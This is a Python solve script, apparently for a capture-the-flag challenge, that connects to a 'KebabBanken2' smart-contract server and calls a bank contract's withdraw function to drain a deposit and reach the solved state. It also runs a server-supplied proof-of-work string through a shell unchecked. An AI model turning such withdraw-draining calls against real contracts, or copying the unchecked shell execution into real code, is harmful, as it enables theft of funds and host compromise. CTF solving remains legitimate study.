import web3
import json
from pwn import *
import subprocess

ADDR = "kebabbanken-2.ctfchall.se"
PORT = 50000

io = remote(ADDR, PORT, ssl=True)

io.sendlineafter(b"> ", b"1")

pow_yay = io.recvline()[:-1].decode()
pow_res = subprocess.check_output(pow_yay, shell=True).decode().strip()
io.sendlineafter(b"Solution please: ", pow_res)

io.recvuntil(b"Blockchain info:\n")

uuid = io.recvline().strip().decode().split(" ")[-1]
rpc = io.recvline().strip().decode().split(" ")[-1].replace("[addr]", ADDR)

# rpc = rpc.replace("[addr]", ADDR)
private_key = io.recvline().strip().decode().split(" ")[-1]
my_addr = io.recvline().strip().decode().split(" ")[-1]
target_addr = io.recvline().strip().decode().split(" ")[-1]

print(f"{uuid = }")
print(f"{rpc = }")
print(f"{private_key = }")
print(f"{my_addr = }")
print(f"{target_addr = }")

with open("abi/KebabBanken2.abi", "r") as openfile:
    bank_abi = json.load(openfile)

with open("abi/Setup.abi", "r") as openfile:
    setup_abi = json.load(openfile)

w3 = web3.Web3(web3.HTTPProvider(rpc))
setup_contract = w3.eth.contract(address=target_addr, abi=setup_abi)
my_addr = w3.eth.account.from_key(private_key).address

bank_addr = setup_contract.functions.bank().call()
print(f"{bank_addr = }")

# tx = setup_contract.constructor().build_transaction({
#     "from": my_addr,
#     "value": w3.to_wei(100, "ether"),  # Ensure the constructor is funded
#     "gas": 5000000,
#     "gasPrice": w3.to_wei("50", "gwei"),
#     "nonce": w3.eth.get_transaction_count(account.address),
# })
# signed_tx = w3.eth.account.sign_transaction(tx, private_key)
# tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
# tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

contract = w3.eth.contract(address=bank_addr, abi=bank_abi)

# print("My balance:", w3.eth.checkBreach(my_addr) / 10**18)

setup_contract.functions.hello().transact(
    {
        "from": my_addr,
        "gas": 1000000,
    }
)

# print(contract.functions.checkBreach().transact(
#     {
#         "from": my_addr,
#         "gas": 1000000,
#     }
# ))

# print(f"test = {contract.functions.checkBreach().call()}")


def trans(func, extra=None):
    txn = func.build_transaction(
        {
            "from": my_addr,
            "gas": 10000000,
            "nonce": w3.eth.get_transaction_count(my_addr),
            "gasPrice": w3.eth.gas_price,
        } | (extra or {})
    )

    signed_txn = w3.eth.account.sign_transaction(txn, private_key)

    txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)

    if txn_receipt["status"] == 1:
        print(f"Transaction Successful! Transaction hash: {txn_hash.hex()}")
    else:
        print(f"{txn = }")
        print(f"{signed_txn = }")
        print(f"{txn_hash = }")
        print(f"{txn_receipt = }")
        print(f"Transaction Failed: {txn_hash.hex()}")

        # try:
        result = w3.eth.call(txn)

        print(f"{result = }")
        # except web3.exceptions.ContractLogicError as e:
        #     if "revert: nooooooooooo'" in str(e):
        #         print(store_3)
        #         exit()
        #     print(e)


def generate_hash(name, identifier, amount):
    # Create a Web3 instance
    # Encode the inputs in the same way Solidity does
    encoded = w3.solidity_keccak(
        ['string', 'string', 'uint256'],
        [name, identifier, amount]
    )
    return encoded.hex()

# Example values (you can replace these with actual inputs)
name = "john pork hawk tuah"
identifier = "initial_deposit"
msg_value = 100 * 10**18  # 100 ether in wei (assuming msg.value is in ether and converted to wei)

# Generate the hash
tx_hash = generate_hash(name, identifier, msg_value)

print("--------", contract.functions.accountNames(my_addr).call())
print("-" * 100)
print(contract.functions.accountNames(my_addr).call())

# trans(contract.functions.deposit(tx_hash), {"value": msg_value * 2})
trans(contract.functions.withdraw("initial_deposit", msg_value))

# trans(contract.functions.constructor())
#
# trans(contract.functions.openAccount("name"), {"value": 100})
# trans(contract.functions.checkBreach())
# KebabBanken2.constructor()

# txn = contract.functions.checkBreach().build_transaction(
#     {
#         "from": my_addr,
#         "gas": 1000000,
#         "gasPrice": w3.eth.gas_price,
#         "nonce": w3.eth.get_transaction_count(my_addr),
#     }
# )
# signed_txn = w3.eth.account.sign_transaction(txn, private_key)
# txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
# txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
# print(f"test {w3.eth.call(txn)}")
#
# print(txn_receipt)


solved = setup_contract.functions.isSolved().call()
print("Is solved?", solved)

# ----------------------------------------------- #

# print(f"{w3.eth.gas_price = }")
# print(f"{w3.eth.get_transaction_count(my_addr) = }")
#
# idx = 1
#
# item_price = w3.to_wei(50, "ether")
# print(f"{item_price = }")
#
# txn = contract.functions.buyItem(idx).build_transaction(
#     {
#         "from": my_addr,
#         "value": item_price,
#         "nonce": w3.eth.get_transaction_count(my_addr),
#         "gas": 1000000,
#         "gasPrice": w3.eth.gas_price,
#     }
# )
#
# signed_txn = w3.eth.account.sign_transaction(txn, private_key)
#
# txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
#
# txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
#
# if txn_receipt["status"] == 1:
#     print(f"Transaction Successful! Transaction hash: {txn_hash.hex()}")
#     print(f"Item bought by: {my_addr}")
# else:
#     print(f"Transaction Failed: {txn_hash.hex()}")

# ----------------------------------------------- #

solved = setup_contract.functions.isSolved().call()
print("Is solved?", solved)

if solved:
    io.close()
    io = remote(ADDR, PORT, ssl=True)
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", uuid.encode())

# io.interactive()
